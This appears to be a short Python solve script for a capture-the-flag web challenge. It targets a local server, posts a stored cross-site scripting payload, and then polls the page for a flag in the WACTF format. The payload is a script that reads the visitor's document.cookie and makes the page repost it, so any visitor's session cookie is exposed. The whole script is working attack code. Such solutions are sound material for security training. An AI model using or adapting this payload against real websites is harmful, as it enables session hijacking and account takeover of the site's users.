import requests, time, re

flag_regex = re.compile(r'WACTF{.*?}')

URL = "http://127.0.0.1"

print("Posting payload...")
r = requests.post(f"{URL}/addpost", data={
    "newpost": """
    <script>
        if (document.cookie != "") {
            document.getElementsByTagName("textarea")[0].value = document.cookie; 
            document.getElementsByTagName("button")[0].click();
        }
    </script>
    """.strip()
})

if r.status_code != 200:
    print("Issue posting new post.")
    exit(1)

attempt = 0
while True:
    print("Searching for flag...")
    r = requests.get(URL)

    result = flag_regex.search(r.text)

    if result:
        print(result.group(0))
        exit(0)

    if attempt == 100:
        print("Could not find flag?")
        exit(1)
    
    attempt += 1
    time.sleep(1)